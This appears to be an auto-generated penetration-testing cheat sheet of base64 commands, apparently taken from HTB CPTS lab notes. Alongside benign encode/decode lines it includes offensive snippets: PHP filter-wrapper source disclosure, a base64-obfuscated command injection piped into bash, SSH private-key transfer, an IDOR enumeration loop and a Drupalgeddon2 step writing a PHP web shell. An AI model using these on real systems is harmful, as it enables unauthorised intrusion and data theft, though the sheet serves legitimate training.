# Base64

% base64, encode, cpts

## Base64 - Base64 - Base64 - Base64 - b64-encode-and-decode
#cat/CODE #cpts
```
cat id_rsa | base64 -w 0;echo
```

## Base64 - Base64 - Base64 - Base64 - b64-encode-and-decode-2
#cat/CODE #cpts
```
echo -n <file>_content | base64 -d > id_rsa
```

## Base64 - Base64 - Base64 - Base64 - preparing-the-base64-blob-for-cracking
#cat/CODE #cpts
```
echo "" | tr -d \\n
```

## Base64 - Base64 - Base64 - Base64 - placing-the-output-into-a-file-as-kirbi
#cat/CODE #cpts
```
cat encoded_file | base64 -d > sqldev.kirbi
```

## Base64 - Base64 - Base64 - Base64 - decode-base64-string-in-linux
#cat/CODE #cpts
Windows File Transfer Methods

```
echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWN
```

## Base64 - Base64 - Base64 - Base64 - decode-base64-string-in-linux-2
#cat/CODE #cpts
Windows File Transfer Methods

```
md5sum hosts
```

## Base64 - Base64 - Base64 - Base64 - linux---decode-the-file
#cat/CODE #cpts
```
echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGF
```

## Base64 - Base64 - Base64 - Base64 - source-code-disclosure
#cat/CODE #cpts
Once we have a list of potential PHP files we want to read, we can start disclosing their sources with the `base64` PHP filter. Let's try to read the source code of `config.php` using the base64 filter, by specifying `co

```
url
```

## Base64 - Base64 - Base64 - Base64 - source-code-disclosure-2
#cat/CODE #cpts
http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://filter/read=convert.base64-encode/resource=config **Note:** We intentionally left the resource file at the end of our string, as the `.php` extension is auto

```
echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d
```

## Base64 - Base64 - Base64 - Base64 - checking-php-configurations
#cat/CODE #cpts
Once we have the base64 encoded string, we can decode it and `grep` for `allow_url_include` to see its value:

```
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
```

## Base64 - Base64 - Base64 - Base64 - remote-code-execution
#cat/CODE #cpts
With `allow_url_include` enabled, we can proceed with our `data` wrapper attack. As mentioned earlier, the `data` wrapper can be used to include external data, including PHP code. We can also pass it `base64` encoded str

```
echo '' | base64
```

## Base64 - Base64 - Base64 - Base64 - expect
#cat/CODE #cpts
Finally, we may utilize the [expect](https://www.php.net/manual/en/wrappers.expect.php) wrapper, which allows us to directly run commands through URL streams. Expect works very similarly to the web shells we've used earl

```
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
```

## Base64 - Base64 - Base64 - Base64 - try-to-exploit-the-upload-form-to-read-the-flag-found-at-the-root-dire
#cat/CODE #cpts
```
shell-session
```

## Base64 - Base64 - Base64 - Base64 - try-to-exploit-the-upload-form-to-read-the-flag-found-at-the-root-dire-2
#cat/CODE #cpts
However, in the intercepted request, students need to change the filename to have the `.svg` extension and `Content-Type` to be `image/svg+xml`: After forwarding the request and checking its response, students will notic

```
echo 'PD9waHAKcmVxdWlyZV9vbmNlKCcuL2NvbW1vbi1mdW5jdGlvbnMucGhwJyk7CgovLyB1cGxvYWRlZCBmaWxlcyBkaXJlY3RvcnkKJHRhcmdldF9kaXIgPSAiLi91c2VyX2ZlZWRiYWNrX3N1Ym1pc3Npb25zLyI7CgovLyByZW5hbWUgYmVmb3JlIHN0b3JpbmcKJGZpbGVOYW1lID0gZGF0ZSgneW1kJykgLiAnXycgLiBiYXNlbmFtZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bIm5hbWUiXSk7CiR0YXJnZXRfZmlsZSA9ICR0YXJnZXRfZGlyIC4gJGZpbGVOYW1lOwoKLy8gZ2V0IGNvbnRlbnQgaGVhZGVycwokY29udGVudFR5cGUgPSAkX0ZJTEVTWyd1cGxvYWRGaWxlJ11bJ3R5cGUnXTsKJE1JTUV0eXBlID0gbWltZV9jb250ZW50X3R5cGUoJF9GSUxFU1sndXBsb2FkRmlsZSddWyd0bXBfbmFtZSddKTsKCi8vIGJsYWNrbGlzdCB0ZXN0CmlmIChwcmVnX21hdGNoKCcvLitcLnBoKHB8cHN8dG
```

## Base64 - Base64 - Base64 - Base64 - try-to-exploit-the-upload-form-to-read-the-flag-found-at-the-root-dire-3
#cat/CODE #cpts
```
└──╼ [★]$ echo 'PD9waHAKcmVxdWlyZV9vbmNlKCcuL2NvbW1vbi1mdW5jdGlvbnMucGhwJyk7CgovLyB1cGxvYWRlZCBmaWxlcyBkaXJlY3RvcnkKJHRhcmdldF9kaXIgPSAiLi91c2VyX2ZlZWRiYWNrX3N1Ym1pc3Npb25zLyI7CgovLyByZW5hbWUgYmVmb3JlIHN0b3JpbmcKJGZpbGVOYW1lID0gZGF0ZSgneW1kJykgLiAnXycgLiBiYXNlbmFtZSgkX0ZJTEVTWyJ1cGxvYWRGaWxlIl1bIm5hbWUiXSk7CiR0YXJnZXRfZmlsZSA9ICR0YXJnZXRfZGlyIC4gJGZpbGVOYW1lOwoKLy8gZ2V0IGNvbnRlbnQgaGVhZGVycwokY29udGVudFR5cGUgPSAkX0ZJTEVTWyd1cGxvYWRGaWxlJ11bJ3R5cGUnXTsKJE1JTUV0eXBlID0gbWltZV9jb250ZW50X3R5cGUoJF9GSUxFU1sndXBsb2FkRmlsZSddWyd0bXBfbmFtZSddKTsKCi8vIGJsYWNrbGlzdCB0ZXN0CmlmIChwcmVnX21hdGNoKCcvLitcLnBo
```

## Base64 - Base64 - Base64 - Base64 - try-to-exploit-the-upload-form-to-read-the-flag-found-at-the-root-dire-4
#cat/CODE #cpts
```
$contentType = $_FILES['uploadFile']['type']
```

## Base64 - Base64 - Base64 - Base64 - try-to-exploit-the-upload-form-to-read-the-flag-found-at-the-root-dire-5
#cat/CODE #cpts
```
$MIMEtype = mime_content_type($_FILES['uploadFile']['tmp_name'])
```

## Base64 - Base64 - Base64 - Base64 - try-to-exploit-the-upload-form-to-read-the-flag-found-at-the-root-dire-6
#cat/CODE #cpts
```
echo "Extension not allowed"
```

## Base64 - Base64 - Base64 - Base64 - try-to-exploit-the-upload-form-to-read-the-flag-found-at-the-root-dire-7
#cat/CODE #cpts
```
echo "Only images are allowed"
```

## Base64 - Base64 - Base64 - Base64 - try-to-exploit-the-upload-form-to-read-the-flag-found-at-the-root-dire-8
#cat/CODE #cpts
```
echo "File too large"
```

## Base64 - Base64 - Base64 - Base64 - try-to-exploit-the-upload-form-to-read-the-flag-found-at-the-root-dire-9
#cat/CODE #cpts
```
echo "File failed to upload"
```

## Base64 - Base64 - Base64 - Base64 - encoded-commands
#cat/CODE #cpts
The final technique we will discuss is helpful for commands containing filtered characters or characters that may be URL-decoded by the server. This may allow for the command to get messed up by the time it reaches the s

```
echo -n 'cat /etc/passwd | grep 33' | base64
```

## Base64 - Base64 - Base64 - Base64 - encoded-commands-2
#cat/CODE #cpts
Now we can create a command that will decode the encoded string in a sub-shell (`$()`), and then pass it to `bash` to be executed (i.e. `bash<<<`), as follows:

```
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

## Base64 - Base64 - Base64 - Base64 - burp-post-request
#cat/CODE #cpts
We may also achieve the same thing on Linux, but we would have to convert the string from `utf-8` to `utf-16` before we `base64` it, as follows:

```
echo -n whoami | iconv -f utf-8 -t utf-16le | base64
```

## Base64 - Base64 - Base64 - Base64 - function-disclosure
#cat/CODE #cpts
This function appears to be sending a `POST` request with the `contract` parameter, which is what we saw above. The value it is sending is an `md5` hash using the `CryptoJS` library, which also matches the request we saw

```
echo -n 1 | base64 -w 0 | md5sum
```

## Base64 - Base64 - Base64 - Base64 - mass-enumeration
#cat/CODE #cpts
Once again, let us write a simple bash script to retrieve all employee contracts. More often than not, this is the easiest and most efficient method of enumerating data and files through IDOR vulnerabilities. In more adv

```
for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
```

## Base64 - Base64 - Base64 - Base64 - using-blind-data-exfiltration-on-the-blind-page-to-read-the-content-of
#cat/CODE #cpts
Decoding the base64 string yields out the flag `HTB{1_d0n7_n33d_0u7pu7_70_3xf1l7r473_d474}`:

```
echo "PD9waHAgJGZsYWcgPSAiSFRCezFfZDBuN19uMzNkXzB1N3B1N183MF8zeGYxbDdyNDczX2Q0NzR9IjsgPz4K" | base64 -d
```

## Base64 - Base64 - Base64 - Base64 - using-blind-data-exfiltration-on-the-blind-page-to-read-the-content-of-2
#cat/CODE #cpts
```
└──╼ [★]$ echo "PD9waHAgJGZsYWcgPSAiSFRCezFfZDBuN19uMzNkXzB1N3B1N183MF8zeGYxbDdyNDczX2Q0NzR9IjsgPz4K" | base64 -d
```

## Base64 - Base64 - Base64 - Base64 - try-to-escalate-your-privileges-and-exploit-different-vulnerabilities-
#cat/CODE #cpts
After sending the request and checking its response, students will attain the base64-encoded string `PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K`: At last, students need to decode it to find the flag `HT

```
echo 'PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K' | base64 -d
```

## Base64 - Base64 - Base64 - Base64 - try-to-escalate-your-privileges-and-exploit-different-vulnerabilities--2
#cat/CODE #cpts
```
└─$ echo 'PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K' | base64 -d
```

## Base64 - Base64 - Base64 - Base64 - drupalgeddon2-2
#cat/CODE #cpts
Next, let's replace the `echo` command in the exploit script with a command to write out our malicious PHP script.

```
echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee mrb3n.php
```

## Base64 - Base64 - Base64 - Base64 - vulncicada
#cat/CODE #cpts
extrait du PDF Joplin: vulncicada

```
echo "MIACA" | base64 -d
```

## Base64 - Base64 - Base64 - Base64 - freelancer
#cat/CODE #cpts
extrait du PDF Joplin: freelancer

```
echo MTAwMTE= | base64 -d 10011 Let's see if we can verify that 10011 is our account ID by browsing around the web application for any additional information disclosure. An obvious place to start would be in our account profile section, but for the sake of brevity, we can look at the Jobs Dashboard and click on an existing employer account name such as Tom Hazard. We take note of the URL that seems to contain an account ID as well. If we leave a review on this job posting and then proceed to highlight the account username we can see that we have verified our account ID. Now that we have verifi
```

